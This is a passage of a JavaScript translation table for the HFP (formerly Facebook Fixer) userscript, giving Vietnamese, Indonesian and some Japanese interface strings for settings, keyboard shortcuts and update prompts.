		'ConfApplicationWhitelist' : 'Danh sách trắng các ứng dụng - Nhập ID của các ứng dụng để nó không bị ẩn. Các ID cách nhau bởi khoảng trắng (dấu cách).',
		'ConfAutoBigAlbumPictures' : 'Tự động hiển thị hình ảnh lớn hơn khi trang web mở ra.',
		'ConfAutoLoadFullAlbum' : 'Tự động tải thumbnails của tất cả hình ảnh của album trong một trang web.',
		'ConfAutoLoadTaggedPhotos' : 'Tự động tải thumbnnails cho tất cả các hình ảnh được tag trong một trang (the photos tab on people\'s profiles).',
		'ConfAutoReadMore' : 'Tự động click vào liên kết "see more".',
		'ConfBigAlbumPictures' : 'Thêm liên kết trên các album để hiển thị các phiên bản lớn hơn của các hình ảnh trên trang đó',
		'ConfBigAlbumPicturesBorder' : 'Thêm viền xung quanh phiên bản lớn hơn của hình ảnh',
		'ConfBookmarks' : 'Thêm menu Bookmarks vào thanh trình đơn trên cùng.',
		'ConfBottomBarHoverOpacity' : 'Khi chuột ở trên',
		'ConfBottomBarOpacity' : 'Độ trong suốt của thanh thực đơn phía dưới',
		'ConfCalendarBirthDate' : 'Bao gồm ngày sinh trong những chi tiết sự kiện.',
		'ConfCalendarFullName' : 'Sử dụng tên đầy đủ như tiêu đề cho ngày sinh (thay vì chỉ là tên).',
		'ConfChatDifferentiate' : 'Sử dụng chữ in đậm và in nghiêng để phân biệt bạn bè đang online và đang rỗi.',
		'ConfChatHideIdle' : 'Ẩn những bạn bè đang rỗi.',
		'ConfDelayPopupPics' : 'Thêm một khoảng trễ trước khi hiển thị hình ảnh bung ra.',
		'ConfDelayPopupPicsTimeout' : 'Thời gian trước khi hiển thị hình ảnh bung ra, trong mili giây (mặc định=500):',
		'ConfDownloadVideo' : 'Thêm một liên kết để tải xuống các video thừ các trang video. (Bạn có thể cần một <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">chương trình chơi FLV</a>)',
		'ConfErrorPageReload' : 'Tự động tải lại những trang ứng dụng lỗi sau 5 giây.',
		'ConfExport' : 'Để trích xuất các thiết lập của bạn, sao chép đoạn văn bản dưới đây và lưu nó trong một tập tin.',
		'ConfExternalPopup' : 'Phiên bản đúng kích cỡ của hình ảnh. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Ngôn ngữ cho HFP',
		'ConfFacebookTimestamps' : 'Hiện mốc thời gian của facebook (ví dụ: "3 hours ago").',
		'ConfFBFTimestamps' : 'Thêm mốc thời gian của HFP sau mốc thời gian của Facebook (ví dụ: "11:45").',
		'ConfFBFTimestamps24' : 'Hiển thị mốc thời gian của HFP dạng 24 giờ.',
		'ConfFriendRequestCountInTitle' : 'Hiển thị số yêu cầu kết bạn trong tiêu đề của trang.',
		'ConfGoogleApps' : 'Tạo Google Calendar tương thích với Google Apps',
		'ConfGoogleAppsDomain' : 'Domain',
		'ConfGoogleCalendar' : 'Thêm liên kết để thêm ngày sinh và các sự kiện cho <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Language for <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Ẩn lịch sử của các ứng dụng.',
		'ConfHideEventStories' : 'Ẩn lịch sử các sự kiện.',
		'ConfHideFacebookCountInTitle' : 'Ẩn số tin nhắn trong hộp thư đến của  Facebook.',
		'ConfHideFriendStories' : 'Ẩn lịch sử của bạn bè.',
		'ConfHideGroupStories' : 'Ẩn lịch sử của nhóm.',
		'ConfHideLikeStories' : 'Ẩn lịch sử "Thích".',
		'ConfHideLinkStories' : 'Ẩn lịch sử của liên kết.',
		'ConfHideNoteStories' : 'Ẩn lịch sử của ghi chú.',
		'ConfHidePhotoStories' : 'Ẩn lịch sử của hình ảnh.',
		'ConfHidePlaceStories' : 'Ẩn lịch sử của địa chỉ.',
		'ConfHideProfilePicStories' : 'Ẩn lịch sử của hình ảnh profile.',
		'ConfHideRead' : 'Ẩn những mục trong feed đã đánh dấu là đã đọc.',
		'ConfHideRelationshipStories' : 'Ẩn lịch sử quan hệ.',
		'ConfHideStatusStories' : 'Ẩn lịch sử trạng thái.',
		'ConfHideVideoStories' : 'Ản lịch sử video.',
		'ConfHideWallStories' : 'Ẩn lịch sử của tường.',
		'ConfHomeBeta' : 'Hiển thị Facebook Sneak Peek.',
		'ConfHomeChat' : 'Hiển thị Chat.',
		'ConfHomeEvents' : 'Hiển thị Events.',
		'ConfHomeFindFriends' : 'Hiển thị Kết Nối.',
		'ConfHomeLeftAlign' : 'Căn trái nội dung của trang chủ.',
		'ConfHomeLeftColumn' : 'Hiển thị cột bên trái.',
		'ConfHomeLeftColumnFixed' : 'Hiển thị cột bên trái, ngay cả khi cuộn xuống.',
		'ConfHomeLink' : 'Hiển thị liên kết "Trang Chủ" trong thanh thực đơn trên cùng.',
		'ConfHomeNavigation' : 'Hiển thị Danh Mục',
		'ConfHomePokes' : 'Hiển thị Pokes',
		'ConfHomeProfile' : 'Hiển thị "Thông tin".',
		'ConfHomeRecommendations' : 'Hiển thị recommendations (People You May Know, Recommended Pages etc).',
		'ConfHomeRequests' : 'Hiển thị Requests.',
		'ConfHomeRightColumn' : 'Hiển thị cột bên phải.',
		'ConfHomeStretch' : 'Hiển thị trang chủ hết chiều rộng của trình duyệt',
		'ConfHomeStretchComments' : 'Kéo căng những bình luận trên trang chủ',
		'ConfiCalendar' : 'Thêm liên kết để tải về một tập tin <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> có tất cả ngày sinh.',
		'ConfImport' : 'Để nhập các thiết lập của bạn, ghi đè lên đoạn văn bản dưới đây bằng các đoạn bạn đã lưu trước đó và kích vào nút "Nhập Vào".',
		'ConfInboxCountInTitle' : 'Hiển thị số tin nhắn trong hộp thư đến trên tiêu đề trang.',
		'ConfLogoutLink' : 'Thêm một liên kết "Đăng xuất" vào thanh trình đơn trên cùng.',
		'ConfNotificationCountInTitle' : 'Hiển thị số thông báo mới trong tiêu đề trang.',
		'ConfNewTabSearch' : 'Để kết quả tìm kiếm mở trong một thẻ/cửa sổ mới khi nhấn Ctrl + Enter khi tìm kiếm',
		'ConfPageTitle' : 'Xóa "Facebook |" khỏi tiêu đề của mọi trang.',
		'ConfPhotoPopup' : 'Bung ra bản lớn hơn của những bức ảnh khi để chuột ở trên hình ảnh.',
		'ConfPopupAutoClose' : 'Tự động đóng hình ảnh bung ra.',
		'ConfPopupSmartAutoClose' : 'Không tự động đóng hình ảnh đã bung ra khi con chuột ở trên nó.',
		'ConfPopupPosition' : 'Vị trí bung hình ảnh',
		'ConfProcessInterval' : 'Khoảng thời gian để xử lý các trang, tính bằng mili giây (mặc định =1000):',
		'ConfProfileLink' : 'Hiển thị liên kết "Trang cá nhân" trên thanh trình đơn trên cùng.',
		'ConfProfilePicPopup' : 'Bung ra hình ảnh của ảnh cá nhân khi để chuột ở trên ảnh',
		'ConfProtocolLinks' : 'Turn messenger IDs on profiles into links that start a conversation with them (Google Talk, Windows Live etc).',
		'ConfSectionAbout' : 'Thông tin về HFP',
		'ConfSectionAdvanced' : 'Lựa chọn nâng cao',
		'ConfSectionEvents' : 'Sinh nhật/Sự Kiện',
		'ConfSectionImportExport' : 'Nhập Vào/Trích Xuất',
		'ConfSectionFeeds' : 'Feeds',
		'ConfSectionHomePage' : 'Trang Chủ',
		'ConfSectionLiveFeed' : 'Live Feed',
		'ConfSectionMenu' : 'Menus/Chat',
		'ConfSectionOther' : 'Lựa chọn khác',
		'ConfSectionPageTitle' : 'Tiêu đề trang',
		'ConfSectionPictures' : 'Hình ảnh',
		'ConfSectionShortcuts' : 'Phím tắt',
		'ConfSecureLinks' : 'Bắt buộc các link của facebook sử dụng giao thức https:// .',
		'ConfShortcutList' : '<b>Keyboard Shortucts</b> (case sensitive):<br /><br /><i>From any page:</i><br />&nbsp;<b>A</b> - Albums/photos<br />&nbsp;<b>B</b> - Toggle buddy list (online friends)<br />&nbsp;<b>C</b> - Tùy Chỉnh HFP<br />&nbsp;<b>D</b> - Birthdays<br />&nbsp;<b>E</b> - Events<br />&nbsp;<b>F</b> - Friends<br />&nbsp;<b>H</b> - Home page<br />&nbsp;<b>I</b> - Inbox<br />&nbsp;<b>K</b> - Add Bookmark<br />&nbsp;<b>L</b> - Select the logout link (press Enter afterwards to log out)<br />&nbsp;<b>N</b> - Notifications<br />&nbsp;<b>P</b> - Your profile<br />&nbsp;<b>R</b> - Requests<br />&nbsp;<b>S</b> - Jump to the search field<br />&nbsp;<b>T</b> - Translate selected text<br />&nbsp;<b>?</b> - Show HFP debug info<br />&nbsp;<b>&lt;escape&gt;</b> - Close pop-ups created by HFP<br /><br /><i>From the home page (filters)</i>:<br />&nbsp;<b>a</b> - Pages<br />&nbsp;<b>f</b> - Live feed<br />&nbsp;<b>g</b> - Groups<br />&nbsp;<b>l</b> - Links<br />&nbsp;<b>n</b> - News feed<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>s</b> or <b>u</b> - Status updates<br />&nbsp;<b>t</b> - Notes<br />&nbsp;<b>v</b> - Videos<br /><br /><i>From profiles</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>w</b> - Wall<br />&nbsp;<b>x</b> - Boxes<br /><br /><i>From pages with pagination (previous, next, etc)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Previous<br />&nbsp;<b>&lt;right arrow&gt;</b> - Next<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - First (when available)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - Last (when available)<br /><br /><i>While viewing albums/photos:</i><br />&nbsp;<b>a</b> - Load all thumbnails (when available)<br />&nbsp;<b>b</b> - Show big pictures<br />&nbsp;<b>c</b> - View comments<br />&nbsp;<b>k</b> - Back to album<br />&nbsp;<b>m</b> - Photos of (person) and me<br /><br /><i>While viewing recent albums and uploaded/tagged photos:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - Recent Albums<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - Mobile uploads<br />&nbsp;<b>o</b> - Photos of me<br />&nbsp;<b>p</b> - My Photos<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - Tagged friends',
		'ConfShortcuts' : 'Kích hoạt tính năng phím tắt.',
		'ConfSign' : 'Hiện chòm sao của một người trong thông tin của họ (nếu họ cung cấp đầy đủ ngày sinh).',
		'ConfTopBarFixed' : 'Giữ thanh thực đơn luôn phía trên màn hình, cả khi di chuyển xuống.',
		'ConfTopBarHoverOpacity' : 'Khi chuột ở trên',
		'ConfTopBarOpacity' : 'Độ trong suốt của thanh thực đơn phía trên',
		'DownloadVideo' : 'Download Video',
		'ExportICalendarFile' : 'Export iCalendar file',
		'ExportICalendarFileWarning' : '(Điều này sẽ mất một khoảng thời gian nếu bạn có rất nhiều bạn bè)',
		'FacebookFixerConflict' : 'Facebook Fixer nay được gọi là HFP.<br /><br />Bởi vì thay đổi tên nên bạn cần phải tự gỡ bỏ Facebook Fixer từ trình duyệt của bạn, hoặc hai kịch bản sẽ xung đột với nhau.<br /><br />Nếu bạn không biết gỡ bỏ một userscript, <a %s>bấm vào đây để được hướng dẫn</a>.',
		'fullAlbumLoaded' : 'tải đầy đủ album',
		'Import' : 'Nhập vào',
		'ImportConfirm' : 'Bạn có chắc chắn muốn nhập các thiết lập này?\nCác cài đặt hiện tại của bạn sẽ bị mất.',
		'ImportFailure' : 'Đã xảy ra lỗi khi nhập các thiết lập của bạn.',
		'ImportSuccess' : 'Quá trình nhập hoàn thành. Bạn có muốn tải lại trang?',
		'Left' : 'Bên trái',
		'LoadingAllPhotos' : 'Đang tải tất cả các ảnh...',
		'loadingFullAlbum' : 'Đang tải tất cả album...',
		'LoadingPic' : 'Đang tải ảnh...',
		'LoadPhotosWarning' : 'Tải tất cả các hình ảnh có thể mất một thời gian dài',
		'Months' : new Array('Tháng 1','Tháng 2','Tháng 3','Tháng 4','Tháng 5','Tháng 6','Tháng 7','Tháng 8','Tháng 9','Tháng 10','Tháng 11','Tháng 12'),
		'ProtocolSkype' : 'Gọi cho %s bằng Skype',
		'ProtocolMSN' : 'Chat với %s bằng Windows Live',
		'ProtocolYahoo' : 'Chat với %s bằng Yahoo Messenger',
		'ProtocolGoogle' : 'Chat với %s bằng Google Talk',
		'ReloadErrorPage' : 'Click để thử lại, hoặc đợi 5 giây',
		'Refresh' : 'Làm Tươi',
		'Remove' : 'Xóa',
		'Right' : 'Bên phải',
		'ShowBigPictures' : 'Hiển thị hình ảnh lớn',
		'Signs' : new Array('Ma Kết','Bảo Bình','Song Ngư','Dương Cưu','Kim Ngưu','Song Tử','Cự Giải','Sư Tử','Xử Nữ','Thiên Bình','Hổ Cáp','Nhân Mã'),
		'today' : 'hôm nay',
		'Translators' : 'Translators',
		'UpdateAvailable1' : 'Đã có bản cập nhật mới cho HFP',
		'UpdateAvailable2' : 'Bạn có muốn cập nhật ngay?',
		'UpdateHomepage' : 'Đi đến trang chủ',
		'UpdateInstall' : 'Cài đặt ngay',
		'UpdateTomorrow' : 'Nhắc lại sau',
		'ViewAlbumComments' : 'Xem bình luận về album',
		'yearsOld' : '%s tuổi'
	},
	
	// Indonesian - Contributed by Ryan Endika Chandra(20110222)
	id : {
	   '_language' : 'Bahasa Indonesia',
	   'AddToCalendar' : 'Tambahkan ke kalender',
	   'AddToGoogleCalendar' : 'Tambahkan ke Kalender Google',
	   'all' : 'semua',
	   'All' : 'Semua',
	   'AllPhotosLoaded' : 'Semua foto telah dimuat',
	   'Automatic' : 'Otomatis',
	   'Birthday' : 'Ulang tahun %s',
	   'BookmarkAdd' : 'Tambahkan Bookmark Baru',
	   'BookmarkExists' : 'Sudah ada bookmark tersedia sebelumnya untuk halaman ini.\n\nPergi ke halaman yang Anda ingin bookmark dan coba lagi.',
	   'BookmarkNamePrompt' : 'Masukan nama untuk bookmark ini:\n%s',
	   'BookmarksManage' : 'Atur Bookmarks',
	   'BookmarksRemoveSelected' : 'Hapus Bookmark yang dipilih',
	   'Bookmarks' : 'Bookmark',
	   'BrowserUnsupported' : 'Browser yang Anda gunakan tidak mendukung fitur ini.',
	   'CreatingFile' : 'Membuat File',
	   'Close' : 'Tutup',
	   'ConfigureFacebookFixer' : 'Atur HFP',
	   'ConfigureInstructions' : 'Semua perubahan telah disimpan dengan baik, tapi beberapa perubahan mungkin tidak akan berpengaruh pada tab-tab yang sudah dibuka.',
	   'ConfAge' : 'Tampilkan umur seseorang pada profilnya (apabila mereka menampilkan tanggal ulang tahunnya lengkap).',
	   'ConfApplicationWhitelist' : 'Application Whitelist - Masukan ID applikasi untuk menjaganya dari penyembunyian. Pisahkan dengan spasi.',
	   'ConfAutoBigAlbumPictures' : 'Otomatis tampilkan album gambar lebih besar ketika halaman dibuka.',
	   'ConfAutoLoadFullAlbum' : 'Otomatis memuat penuh semua gambar di dalam album pada satu halaman.',
	   'ConfAutoLoadTaggedPhotos' : 'Otomatis memuat penuh semua foto yang ditandai pada satu halaman. (tab foto pada profil seseorang).',
	   'ConfAutoReadMore' : 'Otomatis klik pada tautan "lihat selengkapnya" .',
	   'ConfBigAlbumPictures' : 'Tambahkan tautan pada halaman album untuk menampilkan versi yang lebih besar dari semua gambar pada halaman tersebut.',
	   'ConfBigAlbumPicturesBorder' : 'Tambahkan border sekitar gambar versi yang lebih besar.',
	   'ConfBookmarks' : 'Tambahkan bookmark submenu ke menu bar atas.',
	   'ConfBottomBarHoverOpacity' : 'Pada mouse-over',
	   'ConfBottomBarOpacity' : 'Menu bar bawah transparan',
	   'ConfCalendarBirthDate' : 'Masukan ulang tahun seseorang pada detail acara.',
	   'ConfCalendarFullName' : 'Gunakan nama lengkap seseorang sebagai judul untuk hari ulang tahun (biasanya hanya nama depan).',
	   'ConfChatDifferentiate' : 'Gunakan huruf tebal dan miring untuk membedakan teman yang tersedia dan diam.',
	   'ConfChatHideIdle' : 'Sembunyikan teman yang diam.',
	   'ConfDelayPopupPics' : 'Tambahkan sebuah penundaan pendek sebelum menampilkan gambar pop-up.',
	   'ConfDelayPopupPicsTimeout' : 'Penundaan sebelum menampilkan gambar popup, dalam millidetik (default=500):',
	   'ConfDownloadVideo' : 'Tambahkan tautan untuk mendownload video dari halaman video. (Anda mungkin membutuhkan <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
	   'ConfErrorPageReload' : 'Otomatis memuat ulang halaman aplikasi error setelah 5 detik.',
	   'ConfExport' : 'Untuk mengexport pengaturan Anda, salinlah teks dibawah dan simpan dalam sebuah file.',
	   'ConfExternalPopup' : 'Versi Popup ukuran penuh untuk gambar luar. <sup>beta</sup>',
	   'ConfFacebookHFPLanguage' : 'Bahasa untuk HFP',
	   'ConfFacebookTimestamps' : 'Tampilkan cap waktu Facebook (contoh "3 jam lalu").',
	   'ConfFBFTimestamps' : 'Tambahkan cap waktu HFP setelah cap waktu Facebook (contoh "11:45").',
	   'ConfFBFTimestamps24' : 'Tampilkan cap waktu HFP dalam format 24 jam.',
	   'ConfFriendRequestCountInTitle' : 'Tampilkan jumlah permintaan teman pada halaman judul.',
	   'ConfGoogleApps' : 'Buat tautan Google Calender kompatibel dengan Google Apps.',
	   'ConfGoogleAppsDomain' : 'Domain',
	   'ConfGoogleCalendar' : 'Tambahkan tautan untuk menambahkan ulang tahun dan acara ke <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
	   'ConfGoogleLanguage' : 'Bahasa untuk for <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
	   'ConfHideApplicationStories' : 'Sembunyikan jejak aplikasi.',
	   'ConfHideEgos' : 'Sembunyikan semua bagian "ego" (seharusnya menyembunyikan semua bagian dari rekomendasi Facebook).',
	   'ConfHideEventStories' : 'Sembunyikan jejak acara.',
	   'ConfHideFacebookCountInTitle' : 'Sembunyikan jumlah pesan di kotak masuk.',
	   'ConfHideFriendStories' : 'Sembunyikan jejak teman.',
	   'ConfHideGroupStories' : 'Sembunyikan jejak group.',
	   'ConfHideHovercards' : 'Sembunyikan hovercards (popup yang muncul ketika mouse Anda dia).',
	   'ConfHideLikeStories' : 'Sembunyikan jejak suka.',
	   'ConfHideLinkStories' : 'Sembunyikan jejak tautan.',
	   'ConfHideNoteStories' : 'Sembunyikan jejak catatan.',
	   'ConfHidePhotoStories' : 'Sembunyikan jejak foto.',
	   'ConfHidePlaceStories' : 'Sembunyikan jejak tempat.',
	   'ConfHideProfilePicStories' : 'Sembunyikan jejak foto profil.',
	   'ConfHideRead' : 'Sembunyikan item dalam feed hidup yang sudah dibaca.',
	   'ConfHideRelationshipStories' : 'Hide relationship stories.',
	   'ConfHideStatusStories' : 'Sembunyikan jejak status.',
	   'ConfHideVideoStories' : 'Sembunyikan jejak video.',
	   'ConfHideWallStories' : 'Sembunyikan jejak dinding.',
	   'ConfHomeBeta' : 'Tampilkan bagian Facebook Sneak Peek.',
	   'ConfHomeChat' : 'Tampilkan bagian chat.',
	   'ConfHomeChatNames' : 'Tampilkan nama dalam chat section.',
	   'ConfHomeEvents' : 'Tampilkan bagian event.',
	   'ConfHomeFindFriends' : 'Tampilkan bagian Get Connected.',
	   'ConfHomeLeftAlign' : 'Ratakan kiri konten pada halaman beranda.',
	   'ConfHomeLeftColumn' : 'Tampilkan kolom kiri.',
	   'ConfHomeLeftColumnFixed' : 'Pertahankan agar kolom kiri tetap terlihat, bahkan saat menscroll kebawah.',
	   'ConfHomeLink' : 'Tampilkan tautan Beranda pada menu bara atas.',
	   'ConfHomeNavigation' : 'Tampilkan bagian Navigasi.',
	   'ConfHomePokes' : 'Tampilkan bagian colek.',
	   'ConfHomeProfile' : 'Tampilkan bagian profil.',
	   'ConfHomeRecommendations' : 'Tampilkan rekomendasi (Orang yang mungkin Anda ketahui, Rekomendasi Halaman dll).',
	   'ConfHomeRequests' : 'Tampilkan bagian Permintaan.',
	   'ConfHomeRightColumn' : 'Tampilkan kolom kanan.',
	   'ConfHomeStretch' : 'Regangkan halaman beranda ke ukuran penuh dari browser.',
	   'ConfHomeStretchComments' : 'Regangkan komenter pada halaman beranda.',
	   'ConfiCalendar' : 'Tambahkan tautan unduh pada file <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> dengan semua ulang tahun.',
	   'ConfImport' : 'Untuk mengimport pengaturan Anda nanti, timpa teks di bawah dengan teks yang sudah Anda simpan sebelumnya dan klik "Import".',
	   'ConfInboxCountInTitle' : 'Tampilkan jumlah pesan di kotak masuk pada judul halaman.',
	   'ConfLogoutLink' : 'Tambahkan tautan keluar/logout ke menu bar atas.',
	   'ConfNewTabSearch' : 'Jadikan hasil pencarian terbuka di tab/jendela baru ketika menekan CTRL + Enter untuk mencari.',
	   'ConfPageTitle' : 'Hapus "Facebook |" pada judul halaman pada setiap halaman.',
	   'ConfPhotoPopup' : 'Popup versi lebih besar dari foto pada saat didekatkan mouse.',
	   'ConfPopupAutoClose' : 'Tutup gambar popup otomatis.',
	   'ConfPopupSmartAutoClose' : 'Pertahankan gambar popup dari penutupan otomatis jika mouse meninggalkan popup.',
	   'ConfPopupPosition' : 'Posisi untuk gambar popup',
	   'ConfPopupWhileTagging' : 'Tampilkan gambar popup bahkan saat menandai.',
	   'ConfProcessInterval' : 'Interval untuk memproses halaman, dalam millidetik (default=1000):',
	   'ConfProfileLink' : 'Tampilkan tautan Profil pada menu bar atas.',
	   'ConfProfilePicPopup' : 'Popup versi lebih besar untuk gambar pada saat didekatkan dengan mouse.',
	   'ConfProtocolLinks' : 'Ubah ID messenger dalam profil ke tautan untuk memulai percakapan dengan merekaTurn messenger IDs on profiles into links that start a conversation with them (Google Talk, Windows Live etc).',
	   'ConfSectionAbout' : 'Tentang HFP',
	   'ConfSectionAdvanced' : 'Lebih Rumit',
	   'ConfSectionEvents' : 'Ulang Tahun/Acara',
	   'ConfSectionImportExport' : 'Import/Export',
	   'ConfSectionFeeds' : 'Feed',
	   'ConfSectionHomePage' : 'Home Page',
	   'ConfSectionLiveFeed' : 'Feed Hidup',
	   'ConfSectionMenu' : 'Menu/Chat',
	   'ConfSectionOther' : 'Pengaturan lain',
	   'ConfSectionPageTitle' : 'Judul halaman',
	   'ConfSectionPictures' : 'Gambar',
	   'ConfSectionShortcuts' : 'Keyboard Shortcuts',
	   'ConfSecureLinks' : 'Perintah tautan Facebook menuju halaman HTTPS.',
	   'ConfShortcutList' : '<b>Keyboard Shortcut</b> (case sensitive):<br /><br /><i>Dari beberapa halaman:</i><br />&nbsp;<b>A</b> - Album/foto<br />&nbsp;<b>B</b> - Daftar teman (teman yang sedang online)<br />&nbsp;<b>C</b> - Pengaturan HFP<br />&nbsp;<b>D</b> - Ulang Tahun<br />&nbsp;<b>E</b> - Acara<br />&nbsp;<b>F</b> - Teman<br />&nbsp;<b>H</b> - Halaman Beranda<br />&nbsp;<b>I</b> - Kotak Masuk<br />&nbsp;<b>K</b> - Tambahkan Bookmark<br />&nbsp;<b>L</b> - Pilih tautan keluar/logout (tekan Enter setelah itu untuk loh out)<br />&nbsp;<b>N</b> - Pemberitahuan<br />&nbsp;<b>P</b> - Profile Anda<br />&nbsp;<b>R</b> - Permintaan<br />&nbsp;<b>S</b> - Pencarian<br />&nbsp;<b>T</b> - Terjemahkan teks terpilih<br />&nbsp;<b>?</b> - Tampilkan info debug HFP<br />&nbsp;<b>&lt;escape&gt;</b> - Tutup popp-up yang dibuat HFP<br /><br /><i>Dari halaman beranda (filter)</i>:<br />&nbsp;<b>a</b> - Pages<br />&nbsp;<b>f</b> - feed hidup<br />&nbsp;<b>g</b> - Group<br />&nbsp;<b>l</b> - Tautan<br />&nbsp;<b>n</b> - feed berita<br />&nbsp;<b>p</b> - Foto<br />&nbsp;<b>s</b> or <b>u</b> - Status<br />&nbsp;<b>t</b> - Catatan<br />&nbsp;<b>v</b> - Video<br /><br /><i>Dari profil</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Foto<br />&nbsp;<b>w</b> - Dindinf<br />&nbsp;<b>x</b> - Boxes<br /><br /><i>Dari halaman dengan pagination (previous, next, dll)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Previous<br />&nbsp;<b>&lt;right arrow&gt;</b> - Next<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - First (jika tersedia)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - Last (jika tersedia)<br /><br /><i>Ketika melihat album/foto:</i><br />&nbsp;<b>a</b> - Muat semua penuh (jika tersedia)<br />&nbsp;<b>b</b> - Tmapilkan gambar besar<br />&nbsp;<b>c</b> - Lihat komentar<br />&nbsp;<b>k</b> - Kembali ke album<br />&nbsp;<b>m</b> - Foto dari (seseorang) dan saya<br /><br /><i>Ketika melihat album sekarang dan foto yang dipload/tag:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - Album sekarang<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - Upload dari Hp<br />&nbsp;<b>o</b> - Foto dari saya<br />&nbsp;<b>p</b> - Foto saya<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - Teman yang ditandai',
	   'ConfShortcuts' : 'Aktifkan keyboard shortcut.',
	   'ConfSign' : 'Tampilkan zodiak seseorang pada profilnya (apabila mereka menampilkan tanggal ulang tahunnya lengkap).',
	   'ConfTopBarFixed' : 'Selalu pertahankan menu bar atas pada layar, juga saat menggulung layar browser Anda.',
	   'ConfTopBarHoverOpacity' : 'Pada mouse-over',
	   'ConfTopBarOpacity' : 'Menu bar atas transparan',
	   'DownloadVideo' : 'Unduh Video',
	   'ExportICalendarFile' : 'Export file iCalendar',
	   'ExportICalendarFileWarning' : '(Ini akan memakan waktu lama apabila Anda mempunyai banyak teman)',
	   'FacebookFixerConflict' : 'Facebook Fixer sekarang dikenal dengan nama HFP.<br /><br />Karena pergantian nama Anda harus menguninstal Facebook Fixer dari browser Anda, atau dua script ini akan bertentangan satu sama lain.<br /><br />Jika Anda tidak mengetahui cara untuk menguninstal script ini, <a %s>Klick disini untuk tata caranya</a>.',
	   'fullAlbumLoaded' : 'album telah dimuat',
	   'Import' : 'Import',
	   'ImportConfirm' : 'Apakag Anda yakin ingin mengimport peraturan ini?\nPeraturan Anda sekarang akan hilang.',
	   'ImportFailure' : 'Kesalahan terjadi ketika mencoba untuk mengimport peraturan Anda.',
	   'ImportSuccess' : 'Import berhasil. Apakah Anda ingin untuk memuat ulang halaman?',
	   'Left' : 'Kiri',
	   'LoadingAllPhotos' : 'Memuat semua foto...',
	   'loadingFullAlbum' : 'memuat album lengkap...',
	   'LoadingPic' : 'Memuat Gambar...',
	   'LoadPhotosWarning' : 'Pemuatan semua foto mungkin butuh waktu lama',
	   'Months' : new Array('Januari','Februari','Maret','April','May','Junu','Julu','Agustus','September','Oktober','November','Desember'),
	   'ProtocolSkype' : 'Berbicara dengan %s menggunakan Skype',
	   'ProtocolMSN' : 'Chat dengan %s menggunakan Windows Live',
	   'ProtocolYahoo' : 'Chat dengan %s menggunakan Yahoo Messenger',
	   'ProtocolGoogle' : 'Chat dengan %s menggunakan Google Talk',
	   'ReloadErrorPage' : 'Klik untuk mencoba lagi, atau tunggu 5 detik lagi',
	   'Refresh' : 'Muat Ulang',
	   'Remove' : 'Hapus',
	   'Right' : 'Kanan',
	   'ShowBigPictures' : 'Tampilkan Gambar-gambar Besar',
	   'Signs' : new Array('Capricorn','Aquarius','Pisces','Aries','Taurus','Gemini','Cancer','Leo','Virgo','Libra','Scorpio','Sagittarius'),
	   'today' : 'hari ini',
	   'Translators' : 'Penerjemah',
	   'UpdateAvailable1' : 'Update tersedia untuk HFP',
	   'UpdateAvailable2' : 'Apakah Anda ingin mengupdate sekarang?',
	   'UpdateHomepage' : 'Pergi ke halaman beranda',
	   'UpdateInstall' : 'Instal sekarang',
	   'UpdateTomorrow' : 'Peringatkan besok',
	   'yearsOld' : '%s tahun'
	},
	
	// Japanese - Contributed by Rui Fujiwara (20110306)
	ja : {
		'_language' : '日本語',
		'AddToCalendar' : 'カレンダーに追加',
		'AddToGoogleCalendar' : 'Googleカレンダーに追加',
		'all' : '全て',
		'All' : '全て',
		'AllPhotosLoaded' : '全ての写真をロード',
		'Automatic' : '自動',
		'Birthday' : '%sさんの誕生日',
		'BookmarkAdd' : '新しいブックマークを追加',
		'BookmarkExists' : 'このページのブックマークは既に存在します．\n\nブックマークしたいページに移動してもう一度実行してください．',
		'BookmarkNamePrompt' : 'このブックマークの名前を入力してください:\n%s',
		'BookmarksConfirmRemoval' : '以下のブックマークを削除してよろしいですか？',
		'BookmarksManage' : 'ブックマークの管理',
		'BookmarksRemoveSelected' : '選択したブックマークを削除',
		'Bookmarks' : 'ブクマ',
		'BrowserUnsupported' : 'この機能をサポートしていないブラウザです．',
		'CreatingFile' : 'ファイルを作成しています',
		'Close' : '閉じる',
		'ConfigureFacebookFixer' : 'HFP設定',
		'ConfigureInstructions' : '変更はすぐに保存されますが，既に開かれたタブには影響しない場合があります',
		'ConfAge' : 'プロフィールに年齢を表示する（生年月日が完全に提供されている場合）',
		'ConfApplicationWhitelist' : 'アプリケーションホワイトリスト - 記事を隠したくないアプリケーションのIDを入力してください．IDの区切りは半角スペースです．',
		'ConfAutoBigAlbumPictures' : 'ページを開いた時に大きいアルバム写真を自動的に表示する',
		'ConfAutoLoadFullAlbum' : '単独ページでアルバム内の全ての画像のサムネイルを自動的に読み込む',
		'ConfAutoLoadTaggedPhotos' : '単独ページ（プロフィールの写真タブ）で全てのタグ付けされた写真のサムネイルを自動的に読み込む',
